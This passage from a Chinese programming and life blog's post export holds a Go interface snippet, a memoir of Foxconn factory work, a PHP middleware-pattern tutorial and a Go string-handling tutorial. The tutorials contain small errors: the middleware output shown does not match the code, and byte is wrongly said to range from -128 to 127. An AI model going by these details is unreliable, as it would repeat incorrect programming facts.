<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Apple)</span> <span class="title">Sell</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    fmt.Println(<span class="string">"我实现了saleable接口"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    apple := models.NewApple(<span class="string">"红富士苹果"</span>, <span class="number">200</span>, <span class="string">"red"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> i models.Saleable</span><br><span class="line">    </span><br><span class="line">    i = &amp;apple</span><br><span class="line">    </span><br><span class="line">    i.Sell()</span><br><span class="line">&#125;</span><br><span class="line">---结果---</span><br><span class="line">我实现了saleable接口</span><br></pre></td></tr></table></figure>
<p>划重点，在GO里面只要一个结构体（struct）定义了一个接口(interface)里面的所有方法，就意味着这个这个struct实现了这个接口，这是隐式的。可见，在Go里面接口还是挺好用的。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>忆往事之富士康</title>
    <url>/2019/life/worker.html</url>
    <content><![CDATA[<blockquote>
<p>讲述2012年去富士康短暂的工作体验，由于年代久远，记忆可能有所偏差，本着回忆和思考的方向，记录一下当时的我，以及现在的我的一些想法。</p>
</blockquote>
<p>2012年冬，郑州市公园的菊花正值盛开，我站在马路立交桥下，看见路边有很多民工摆摊，广告牌上面写着装修水电，其实我对这座城市并没有什么想法，不知为什么会停下脚步。</p>
<a id="more"></a>

<img src = "/images/2020-03-23.jpg" />

<p>我在马路边漫无目的走着，突然看见富士康的招工点，有几个工作人员，问了一下，得知他们是为江苏淮安富士康招人的，我的心中顿时有一个想法：江苏淮安离安徽还挺近，不如先报名，跟着车一起去江苏，连路费都省了，于是拿出身份证报名了。</p>
<blockquote>
<p>那会富士康在国内早已以“跳楼”出名，在大陆拥有百万员工，据说在郑州富士康就有一个几十万人的园区，可以说是中国电子制造业的巨头，至今依然如此</p>
</blockquote>
<p>可能是为了凑齐人，在等待许久之后，我才上了一辆大巴，被连夜运往江苏淮安，夜里睡的不是很好，第二天一早便开始登记，富士康的招工标准非常简单，只要只要你有手有脚，没有身体残疾，没有犯罪历史，拿着身份证就可以立马入职，基本资料随便填也无人去核实，我在学历那栏里面填了高中。</p>
<img src = "/images/2020-03-23_1.jpg" />

<p>然后就是给你分配工卡、分配员工宿舍，宿舍是上下铺，房间也是随机分配的，铁床上面一张木板，我花了几十块钱在楼下的小卖店里面买了一套床被，虽然条件极其简陋，但最起码算是有个住所，屋子里面的人互不相识，我印象中没有和他们交流过，基本上就是晚上回去睡个觉，早上洗脸刷牙走人。宿舍里面有投币的洗衣机可以洗衣服，几块钱洗一次，我印象中，这样的床位一个月费用好像是300还是500块钱，当然如果你愿意，你可以选择自己在外租房！</p>
<img src = "/images/2020-03-23_2.jpg" />

<p>第二天，作为一个新人，我首先是接受了一个简短的入职培训，培训如何鉴别 <strong>iPhone</strong>(我并不确定是iphone4还是iPhone5)的数据线，苹果对产品的品控要求非常严格，连数据线也不意外，一根数据线有十几道工序，而我所负责的那道工序就是鉴别品质，根据品质的好坏给数据线分等级，比如A、B、C，标准就是数据线是否有划痕，包括线皮的划痕、USB金属头的划痕，然后还有是否有油污，如果有油污必须使用橡皮擦擦干净，实际上，我在这段时间内做的最多的就是拿着橡皮擦拭USB金属头和表面。</p>
<p>简短的培训之后，我就被分配到一个流水线上了，开始正式工作！</p>
<img src = "/images/2020-03-23_3.jpg" />

<p>富士康对信息安全要求非常严格，进入车间不许带手机，必须把手机放到保管箱里面，每次进出必须全方面安检，异常繁琐，但是也有人能把手机带进去。</p>
<p>车间内部声音非常嘈杂，混合了空调通风设备、流水线上的机器声音、人的交谈喊话声。严格来说，流水线上面是不允许聊天说话的，也不许戴耳机听歌，但是实际在真正执行这些规则的时候有很大余地，一般情况下，只要不是太过分，工作做好也没人管你。</p>
<p>在这里，人就是当机器使用，无论男女，当然如果你颜值高或者和组长关系好，也可以少干点活，没事摸摸鱼！</p>
<p>在车间里面有一群人是属于比较轻松的一类，比如QA，他们是负责抽查产品质量，如果发现有问题有权力把产品打回流水线重做。还有一些维修人员，也是一帮年龄相仿的年轻人，没事干的时候就瘫坐在旁边，偶尔会被叫去修理机器等一些设备。他们是属于那种有一定技术能力的蓝领，而我这种则属于最底层的完全卖苦力的工人。</p>
<img src = "/images/2020-03-23_4.jpg" />

<p>时间久了，和旁边的人逐渐熟悉，在闲聊之中得知，他们当中有些在校大学生，一般是一些大专高职院校，学校安排到富士康实习，不来的话没法毕业，这类情况后来很多媒体也报道过。</p>
<p>其中有3位，我印象非常深刻，不过我现在早已记不得他们的名字，也没有任何联系方式！其中一位小哥，看起来当时应该比我小很多岁，正常来说，他那个年龄应该还在上高中，但是他为什么要来工厂呢？</p>
<p>他时常和我们吹嘘自己在外面如何如何牛逼，认识黑社会，打架斗殴什么都不怕，他戏说自己进厂就是为了泡妞的，找女朋友。后来逐渐了解到，他家在成都，父母是教师，家庭离异，他从家里偷钱买了飞机票飞到这里。他平时非常注重打扮，发型时尚，穿着韩版小西服，确实挺帅气，就是看上去年龄非常小，也很叛逆，好像是未成年，据说是拿着别人身份证进厂的。</p>
<p>他是一个非常欢乐的人，有他在身边工作就不显得那么沉闷，时常搞一些小动作，开一些玩笑，逗对面的女生玩，甚至说一些荤段子。虽然他确实抽烟喝酒啥都会，但他确实也不是什么黑社会的人，更多是一个叛逆的少年，他经常要我带烟给他抽，我忘了最后有没有买过烟给他。记得有一次，不知道聊天的时候说到什么了，他突然不说话了，红着眼，一个人坐了很久。</p>
<p>我对面有2个女生，都是河南的，她们俩比较熟，都是在校学生，被学校贩卖到这里来，并不是心甘情愿来到这里。由于我们几次坐在一起，没事一起瞎聊，其中一个人说到她家有矿，我说家里有矿还来厂里干啥，她说并不是，矿是租的，虽然流动资金大，但是并不赚钱，也就是辛苦钱。小哥经常“调戏”他们俩，有一个妹子脸皮比较薄，时常被逗的很气，记得有一次小哥开了一个“馒头”的笑话，彻底惹怒了她，几天没理我们。</p>
<p>工厂的流水线无休无止，白班晚班两天倒，每个人都像机器人一样，只要完成自己那一小部分工作，重复1遍，2遍，100遍，1万遍。。。没有任何感情！在车间里面你会感觉时间过的很快，每隔2小时休息15分钟，一天又一天，每天重复的劳作，感觉不到时间的存在。</p>
<p>最可怕的是在这样封闭的环境内，人会变的非常懒散，没有追求，没有希望，你的眼里只有那些重复劳作，来不及思考人生，每天想尽各种办法熬过去，试图找点乐趣来弥补这段空白的时间。</p>
<p>我现在已经想不起来那段时间我在那里干了哪些事情，我想这大概是因为我把一件事情重复干了1个多月，每天早上打卡签字、操场集合、进入车间、坐到工位上、中午食堂吃饭、吃完饭回工位、睡一会、下午继续工作、然后吃晚饭、回去加班到9点、下班回去宿舍、直接睡觉，第二天重复如此！每周6天！在中国大大小小的工厂支撑了中国几亿人的就业，大部分工厂人的生活都是如此。</p>
<p>有一天晚上下班的时候碰见我们组长，我问他来了多久，他说他没多久，刚从学校毕业，介绍安排在这里，他在工厂外面租房住，虽然组长大部分时候是作为一个管理者，相对轻松点，但是工厂里面基层管理往往是很粗放的，什么样的人都有，没点本事镇不住，并不是一件好差事。</p>
<p>不知道从某天开始，流水线上没什么活了，QA开始挑我们产品的毛病，组长也在死抓纪律，很多人都知道这是工厂没订单了，最后有一天很多人都离职了，换厂的换厂，回家的回家，我也回家了。这几乎是不成文的规矩，很多工厂，特别是一些轻工业，比如电子厂全靠加班工资，尤其是富士康，一般薪资构成如下：以当年的收入水平来算，基本工资1850，这是8小时工作制的工资，平时加班1.5倍、周末加班2倍、国家法定节假日3倍，实际综合收入4000-5000左右。</p>
<p>如果说有一点好的地方就是这些工厂完全按照劳动法办事，比如加班工资。很多人很好奇，为什么这些工厂要这样做，原因很简单，工厂没订单的时候不会白养这么多工人，所以基本工资会非常低，这样很多人自愿就离开了，工厂裁员的成本很高，所以基本不会裁员，最多是逼你自离。</p>
<p>这种情况在中国工厂太普遍了，既符合劳动法规定，又能灵活控制员工数量和企业人力成本，所以大家可以看到新闻报道富士康有时候会突然大量招人，那是因为刚接到苹果订单，几个月后订单完成，工厂就慢慢的在清理人！（资本主义的丑恶嘴脸暴露无疑）</p>
<p>我必须承认，中国的这些工厂解决几亿农民工进城务工问题，这也是中国成为世界工厂的底气所在！任何一个人，无论男女，即使你不识字，只要有手有脚就可以进厂打工，如果按照2020年大部分工厂的工资水平，肯加班，比如996，每月工资大概在6-7k左右，而且开销很小，在工厂里面吃住都比较便宜，这样一年算下来比种地的收入高很多。</p>
<p>但愿某一天，人类能够发明出高效的机器，把人从这些重复无聊的体力劳动中解放，即使是现在大部分20岁左右的年轻人，特别是农村的，如果学习成绩不好除了进厂之外并没有什么好的选择。随着中国人口红利的结束，人力成本越来越高，很多外资工厂开始往东南亚迁移，这或许并不是坏事，中国可以有更多人从事富有创造力和生产力的工作，而不是把青春都挥洒在无休无止的流水线上。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>详解中间件设计模式</title>
    <url>/2019/coding/designpattern-middleware.html</url>
    <content><![CDATA[<p>说到中间件（middleware），很多人应该都听说过，但是大体有2种意思，一种是一些衔接不同软件活系统的中间软件，比如说数据库中间件、消息中间件。另一种是在Web软件开发中代码层面的一种设计模式，比如说用户认证中间件、日志中间件，这些中间件的主要作用就是以一种集中统一、几乎无侵入的的方式去处理用户请求,而今天我们要讲的就是中间件设计模式。</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>说起中间件模式，估计很多人都想起来下面这张图，一个Web请求经过多个中间件的过滤，像pipeline一样处理这个请求，最终返回响应。</p>
<img src = "/images/old/5f6e3e27ly1g3ow77jcovj20it0e9aas.jpg" />

<p>中间件往往部署在路由的地方，用于统一过滤请求，举个例子，我们有一个特殊的服务，必须要求用户的年龄大于18岁，如果不使用中间件，我们传统的做法就是在每个请求的控制器或者方法里面做判断，从功能上说没啥问题，但是代码不够优雅，需要写很多重复代码，而且不利于维护，哪天我们要把这个年龄改成20岁呢？</p>
<img src = "/images/old/5f6e3e27ly1g3owo9uj4hj20i30a1t9o.jpg" />

<p>但是常见的23种设计模式里面并没有中间件模式，其实中间件是管道模式（也有人说是装饰模式）的一种实现，我也不知道为什么大部分框架都叫做中间件(middleware)…?</p>
<p>说个题外话，大部分设计模式主要就是为了解耦，提高代码可维护性和扩展性，并不是必须的，但是大部分情况下还是有益的。</p>
<h2 id="管道模式"><a href="#管道模式" class="headerlink" title="管道模式"></a>管道模式</h2><p>管道又称为pipeline，又叫流水线，工厂里面流水线大家应该都见过，一个产品需要经过很多道工序才能完成，比如苹果手机的一根数据线，大概有20多道工序，在工厂里面这些数据线会被放到传送带上面，依次完成各个工序，我们可以把一个请求看作是一个产品，流水线的每道工序看作是处理对象。</p>
<p>下面直接看代码：</p>
<p>1.Middleware.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Middleware</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">(Closure $next)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.LogMiddleware.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogMiddleware</span> <span class="keyword">implements</span> <span class="title">Middleware</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">(Closure $next)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Before Log!\n"</span>;</span><br><span class="line">        $next();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"After Log!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.AuthMiddleware.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthMiddleware</span> <span class="keyword">implements</span> <span class="title">Middleware</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">(Closure $next)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Before Check Auth!\n"</span>;</span><br><span class="line">        $next();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"After Check Auth!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4.Client.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $middlewares = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMiddleware</span><span class="params">(Middleware $middleware)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;middlewares[] = $middleware;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getClosure</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">($current, $next)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span> <span class="title">use</span> <span class="params">($current, $next)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">new</span> $next)-&gt;execute($current);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">defaultHandler</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"开始处理!\n"</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        call_user_func(array_reduce(<span class="keyword">$this</span>-&gt;middlewares, <span class="keyword">$this</span>-&gt;getClosure(), <span class="keyword">$this</span>-&gt;defaultHandler()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先，我们定义了一个Middleware接口，规定了需要实现的方法，然后定义了多个具体实现类。有一个非常关键的地方就是这个方法的参数是有一个闭包函数，然后在实现类里面我们都必须调用这个方法。</p>
<p>最核心的代码在于Client类，首先它有一个成员变量，里面存储了多个实现了Middleware接口的对象，这个类里面最关键的方法就是getClosure，它返回一个闭包函数，这个闭包函数接受2个参数，这2个参数都是实现了Middleware接口的对象，但是这个闭包函数并没有立马执行。</p>
<p>其中一个非常关键的函数就是array_reduce,根据官方文档，array_reduce() 将回调函数 callback 迭代地作用到 array 数组中的每一个单元中，从而将数组简化为单一的值。先看一个非常简单的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">$sum = array_reduce($arr, <span class="string">'sum'</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span><span class="params">($a, $b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"before add: $a, $b\n"</span>;</span><br><span class="line">  $sum =  $a + $b;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"after add: $a, $b\n"</span>;</span><br><span class="line">  <span class="keyword">return</span> $sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump($sum);</span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">before add: <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">after add: <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">before add: <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">after add: <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">before add: <span class="number">3</span>, <span class="number">3</span></span><br><span class="line">after add: <span class="number">3</span>, <span class="number">3</span></span><br><span class="line">before add: <span class="number">6</span>, <span class="number">4</span></span><br><span class="line">after add: <span class="number">6</span>, <span class="number">4</span></span><br><span class="line">before add: <span class="number">10</span>, <span class="number">5</span></span><br><span class="line">after add: <span class="number">10</span>, <span class="number">5</span></span><br><span class="line"></span><br><span class="line">int(<span class="number">15</span>)</span><br></pre></td></tr></table></figure>
<p>可见array_reduce会循环的把数组里面的数据两两代入函数，然后把返回的结果当作新的参数再次代入函数,最终会返回一个多层嵌套的闭包函数，然后通过call_user_func触发调用，这时候就会像拨洋葱一样，先从外面到里面，再从里面往外面。。。</p>
<p>上面的例子运行代码和结果如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$client = <span class="keyword">new</span> Client();</span><br><span class="line"></span><br><span class="line">$client-&gt;addMiddleware(<span class="keyword">new</span> LogMiddleware())</span><br><span class="line">    -&gt;addMiddleware(<span class="keyword">new</span> AuthMiddleware());</span><br><span class="line"></span><br><span class="line">$client-&gt;handler();</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Before Check age!</span><br><span class="line">Before Log!</span><br><span class="line">开始处理!</span><br><span class="line">After Log!</span><br><span class="line">After Check Age!</span><br></pre></td></tr></table></figure>
<p>仔细看一下这个结果，是不是非常像第一张图那样，不过这个例子里面少了一个非常重要的request对象，这里纯粹只是展示中间件运行原理，完整的实战代码可以参考laravel框架里面的源码，实现原理差不多，只不过框架功能更加全面，考虑的东西更多。</p>
]]></content>
      <categories>
        <category>Coding</category>
      </categories>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang字符串处理函数浅析</title>
    <url>/2019/coding/golang/golang-string-function.html</url>
    <content><![CDATA[<p>很多从PHP转Go的小伙伴经常会怀恋PHP丰富的字符串函数，Go的标准库针对字符串的操作函数虽然不少但是还是不够丰富，很多时候还得自己造，下面我就结合PHP里面字符串的操作函数来说说Go里面怎么实现。</p>
<h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><p>Go是强类型语言，有一个单独的字符串类型 string，如果熟悉Go语言的人应该了解string底层是切片，切片底层是数组，所以字符串也叫字符数组。</p>
<p>举个最简单的例子，有一个字符串 12ab34cd56, 我们要获取其第3到第5个字符之间的元素怎么做呢？</p>
<p>熟悉PHP的童鞋可以会想到PHP里面有一个 substr的函数可以做到，但是Go里面呢？</p>
<p>我们打开IDE看一下，其实标准库里面的 strings 包已经有非常多的函数了，大约有20多个，包含常见的trim、index、replace、contain等功能，但是没有找到我们想要的？</p>
<p>其实很简单，因为string本质上是切片，所以我们可以直接使用切片来分割字符串：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    str := <span class="string">"12ab34cd56"</span></span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, str[<span class="number">2</span>:<span class="number">4</span>]) <span class="comment">//ab</span></span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, str[<span class="number">3</span>:]) <span class="comment">//b34cd56</span></span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, str[:<span class="number">3</span>]) <span class="comment">//12a</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>切片的切割用法就不多说了，从0角标开始，包含开始，不包含结束。</p>
<p>不过这种写法是有bug的，它只可以针对单字节字符，针对中文这种多字节字符串就不可以了，PHP里面也一样，PHP里面针对多字节字符有一个 mbstring 扩展，也有 mb_substr 这样的函数专门处理多字节字符。</p>
<h2 id="Rune"><a href="#Rune" class="headerlink" title="Rune"></a>Rune</h2><p>在国内编程，大部分时候不可避免的要处理中文字符串，所以像计算长度、切割一定要处理好多字节的问题，Go里面针对多字节的字符有一个rune类型，针对上面的这个问题，我们这样做：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    str := <span class="string">"我爱学习Go语言"</span></span><br><span class="line"></span><br><span class="line">    rStr := []<span class="keyword">rune</span>(str)</span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, <span class="keyword">string</span>(rStr[<span class="number">2</span>:<span class="number">4</span>])) <span class="comment">//学习</span></span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, <span class="keyword">string</span>(rStr[<span class="number">3</span>:])) <span class="comment">//习Go语言</span></span><br><span class="line"></span><br><span class="line">    fmt.Printf(<span class="string">"%s\n"</span>, <span class="keyword">string</span>(rStr[:<span class="number">3</span>])) <span class="comment">//我爱学</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种方式完全没问题，如果说问题可能就在于多了一次内存分配，那rune到底是什么呢？</p>
<p>rune类型在Go里面实际上是int32的别名：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// byte is an alias for uint8 and is equivalent to uint8 in all ways. It is</span></span><br><span class="line"><span class="comment">// used, by convention, to distinguish byte values from 8-bit unsigned</span></span><br><span class="line"><span class="comment">// integer values.</span></span><br><span class="line"><span class="keyword">type</span> <span class="keyword">byte</span> = <span class="keyword">uint8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// rune is an alias for int32 and is equivalent to int32 in all ways. It is</span></span><br><span class="line"><span class="comment">// used, by convention, to distinguish character values from integer values.</span></span><br><span class="line"><span class="keyword">type</span> <span class="keyword">rune</span> = <span class="keyword">int32</span></span><br></pre></td></tr></table></figure>
<p>byte是8位，可以表示-128-127之间的数，用来存储单字节字符刚好，但是中文一般使用2-3个字节表示，byte就无能为力了，但是int32用来表示世界上所有字符也绰绰有余。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">r := <span class="string">"我爱学习Go语言"</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">"%s\n"</span>, r)</span><br><span class="line">fmt.Printf(<span class="string">"%v\n"</span>, []<span class="keyword">byte</span>(r))</span><br><span class="line">fmt.Printf(<span class="string">"%v\n"</span>, []<span class="keyword">rune</span>(r))</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行结果如下：</span></span><br><span class="line">我爱学习Go语言</span><br><span class="line">[<span class="number">230</span> <span class="number">136</span> <span class="number">145</span> <span class="number">231</span> <span class="number">136</span> <span class="number">177</span> <span class="number">229</span> <span class="number">173</span> <span class="number">166</span> <span class="number">228</span> <span class="number">185</span> <span class="number">160</span> <span class="number">71</span> <span class="number">111</span> <span class="number">232</span> <span class="number">175</span> <span class="number">173</span> <span class="number">232</span> <span class="number">168</span> <span class="number">128</span>]</span><br><span class="line">[<span class="number">25105</span> <span class="number">29233</span> <span class="number">23398</span> <span class="number">20064</span> <span class="number">71</span> <span class="number">111</span> <span class="number">35821</span> <span class="number">35328</span>]</span><br></pre></td></tr></table></figure>

<p>从上面的例子也可以说明，中文“我”实际上是以230 136 145 3个字节表示的，但是在rune类型里面是以25105表示的，这个数是Unicode编码的10进制表现形式。</p>
<p>所以，我们可以把一个字符串先转成rune数组，然后再使用切片切割。</p>
<h2 id="for…range"><a href="#for…range" class="headerlink" title="for…range"></a>for…range</h2><p>字符串本质上是字符数组，所以有也可以使用range遍历，而且range在迭代字符串的时候也是按字符遍历的，我们也可以利用这点分割字符串：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SubString</span><span class="params">(str <span class="keyword">string</span>, start, end <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> n, i, k <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k = <span class="keyword">range</span> str &#123;</span><br><span class="line">        <span class="keyword">if</span> n == start &#123;</span><br><span class="line">            i = k</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> n == end &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        n++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str[i:k]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><p>再看一个比较常见的PHP函数，反转字符串，在Go标准库里面也没有相应的实现</p>
<p>如果只考虑单字节我们可以很容易写出下面的代码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReverseString</span><span class="params">(str <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    b := []<span class="keyword">byte</span>(str)</span><br><span class="line">    <span class="keyword">for</span> i, j := <span class="number">0</span>, <span class="built_in">len</span>(b)<span class="number">-1</span>; i &lt; <span class="built_in">len</span>(b)/<span class="number">2</span>; i, j = i+<span class="number">1</span>, j<span class="number">-1</span> &#123;</span><br><span class="line">        b[i], b[j] = b[j], b[i]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">string</span>(b)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果考虑到中文等多字节字符可以参考下面这种方式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReverseRuneString</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> start, size, end <span class="keyword">int</span></span><br><span class="line">    buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(s))</span><br><span class="line">    <span class="keyword">for</span> end &lt; <span class="built_in">len</span>(s) &#123;</span><br><span class="line">        _, size = utf8.DecodeRuneInString(s[start:])</span><br><span class="line">        end = start + size</span><br><span class="line">        <span class="built_in">copy</span>(buf[<span class="built_in">len</span>(buf)-end:], s[start:end])</span><br><span class="line">        start = end</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">string</span>(buf)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><p>除了字符串之外，PHP的数组功能也很强大，如果你不想自己造轮子，可以使用现成的第三方库，下面简单介绍一下几个项目：</p>
<h3 id="1-https-github-com-syyongx-php2go"><a href="#1-https-github-com-syyongx-php2go" class="headerlink" title="1.https://github.com/syyongx/php2go"></a>1.<a href="https://github.com/syyongx/php2go" target="_blank" rel="noopener">https://github.com/syyongx/php2go</a></h3><p>这个项目是使用Go实现PHP内置的函数库，东西比较多，不过这个库里面并没有特殊处理多字节字符串，需要注意一下。</p>
<h3 id="2-https-github-com-thinkeridea-go-extend"><a href="#2-https-github-com-thinkeridea-go-extend" class="headerlink" title="2.https://github.com/thinkeridea/go-extend"></a>2.<a href="https://github.com/thinkeridea/go-extend" target="_blank" rel="noopener">https://github.com/thinkeridea/go-extend</a></h3><p>这个项目收集了一些常用的操作函数，辅助更快的完成开发工作，并减少重复代码，都是一些比较实用的函数，虽然没有第一个那么全。</p>
<h3 id="3-https-github-com-jianfengye-collection"><a href="#3-https-github-com-jianfengye-collection" class="headerlink" title="3.https://github.com/jianfengye/collection"></a>3.<a href="https://github.com/jianfengye/collection" target="_blank" rel="noopener">https://github.com/jianfengye/collection</a></h3><p>Collection包目标是用于替换golang原生的Slice，使用场景是在大量不追求极致性能，追求业务开发效能的场景。</p>
]]></content>
      <categories>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Web开发中用到的Cache</title>
